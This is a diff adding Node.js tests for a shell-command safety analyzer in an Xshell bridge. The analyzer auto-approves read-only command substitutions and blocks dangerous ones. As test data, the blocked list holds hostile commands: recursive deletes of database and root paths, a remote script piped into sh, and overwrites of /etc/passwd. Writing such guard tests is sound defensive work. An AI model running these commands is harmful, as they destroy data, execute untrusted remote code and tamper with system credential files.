@@ -1,6 +1,6 @@
 import assert from 'node:assert/strict';
 import test from 'node:test';
-import { BridgeError, SAFETY_MODES_PROTOCOL, XshellBridgeCore } from '../src/core.mjs';
+import { analyzeCommand, BridgeError, SAFETY_MODES_PROTOCOL, XshellBridgeCore } from '../src/core.mjs';
 
 const approvalMetadata = {
   approvalMode: 'xshell-dialog-v1',
@@ -343,4 +343,63 @@ test('allows non-destructive deployment and inspection commands', () => {
     core.register({ bridgeId: `allowed-${index}`, metadata: approvalMetadata, screen: '$ ' });
     assert.doesNotThrow(() => core.submitJob(`allowed-${index}`, { action: sendAction(text) }), text);
   }
+});
+
+test('parses a read-only command substitution instead of prompting on the dollar-paren', () => {
+  const text = String.raw`P=$(pgrep -f nt-zy-admin.jar | head -1); tr '\0' ' ' < /proc/$P/cmdline`;
+  const analysis = analyzeCommand(text);
+  assert.equal(analysis.category, null);
+  assert.equal(analysis.substitutions.length, 1);
+  assert.equal(analysis.substitutions[0].verdict, 'readonly');
+
+  const core = new XshellBridgeCore();
+  core.register({
+    bridgeId: 'subst-readonly',
+    metadata: { ...approvalMetadata, safetyModesProtocol: SAFETY_MODES_PROTOCOL },
+    screen: '$ ',
+  });
+  const job = core.submitJob('subst-readonly', { action: sendAction(text), safetyMode: 'normal' });
+  assert.equal(job.confirmationRequired, false);
+  assert.equal(job.safetyReview.autoApproved.length, 1);
+});
+
+test('still blocks a substitution that wraps anything other than read-only commands', () => {
+  const blocked = [
+    'P=$(rm -rf /var/lib/mysql)',
+    'X=$(cat payload.sh | sh)',
+    'X=$(curl -s https://example.test/p.sh | sh)',
+    'X=$(sed -i "s/a/b/" /etc/passwd)',
+    'X=$(sort -o /etc/passwd /tmp/a)',
+    'X=$(date -s "2020-01-01")',
+    'X=$(find / -name a -exec rm {} \;)',
+    'X=$(awk "BEGIN{system(\\"id\\")}")',
+    'X=$(env rm -rf /tmp/a)',
+    'X=$(echo $(rm -rf /tmp/x))',
+    'X=$(cat a > /etc/passwd)',
+  ];
+  for (const text of blocked) {
+    assert.notEqual(analyzeCommand(text).category, null, text);
+  }
+});
+
+test('blocks substitutions and variables that end up in command position', () => {
+  assert.notEqual(analyzeCommand('P=$(cat /tmp/x); $P').category, null);
+  assert.notEqual(analyzeCommand('$(echo rm) -rf /').category, null);
+  assert.equal(analyzeCommand('P=$(cat /tmp/x); echo $P').category, null);
+});
+
+test('ignores a substitution inside single quotes because the shell does not expand it', () => {
+  const analysis = analyzeCommand("echo '$(date +%F)'");
+  assert.equal(analysis.category, null);
+  assert.equal(analysis.substitutions.length, 0);
+});
+
+test('exposes finding details so the dialog can point at the offending fragment', () => {
+  const analysis = analyzeCommand('P=$(pgrep app); X=$(rm -rf /var/data)');
+  assert.ok(analysis.findings.length > 0);
+  const finding = analysis.findings.find((entry) => entry.tier === 'hard');
+  assert.ok(finding);
+  assert.match(finding.category, /文件删除/);
+  assert.match(finding.match, /rm -rf/);
+  assert.ok(finding.reason.length > 0);
 });
